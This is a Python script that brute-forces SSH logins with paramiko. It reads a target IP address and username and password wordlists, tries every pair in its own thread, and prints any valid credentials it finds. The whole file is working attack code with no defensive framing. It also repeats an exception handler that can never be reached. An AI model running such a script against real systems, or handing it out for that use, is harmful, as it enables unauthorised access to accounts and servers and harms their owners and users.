#!/usr/bin/env python

import paramiko
from threading import Thread, Lock

def ssh_login(username, password, ip, lock):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password, timeout=5)
        lock.acquire()
        print(f"Valid credentials found: Username: {username}, Password: {password}")
        lock.release()
        client.close()
    except paramiko.AuthenticationException:
        lock.acquire()
        print(f"Invalid credentials: Username: {username}, Password: {password}")
        lock.release()
    except paramiko.SSHException as e:
        lock.acquire()
        print(f"SSH error occurred while connecting to {ip}: {str(e)}")
        lock.release()
    except paramiko.SSHException as e:
        lock.acquire()
        print(f"SSH error occurred while connecting to {ip}: {str(e)}")
        lock.release()
    except paramiko.socket.error as e:
        lock.acquire()
        print(f"Socket error occurred while connecting to {ip}: {str(e)}")
        lock.release()
    except Exception as e:
        lock.acquire()
        print(f"An error occurred while connecting to {ip}: {str(e)}")
        lock.release()

def main():
    ip = input("Enter the IP address: ")
    username_file = input("Enter the path to the username file: ")
    password_file = input("Enter the path to the password file: ")

    with open(username_file, "r") as user_file:
        usernames = user_file.read().splitlines()

    with open(password_file, "r") as pass_file:
        passwords = pass_file.read().splitlines()

    # Create a lock to synchronize printing
    lock = Lock()

    threads = []
    for username in usernames:
        for password in passwords:
            thread = Thread(target=ssh_login, args=(username, password, ip, lock))
            thread.start()
            threads.append(thread)

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()

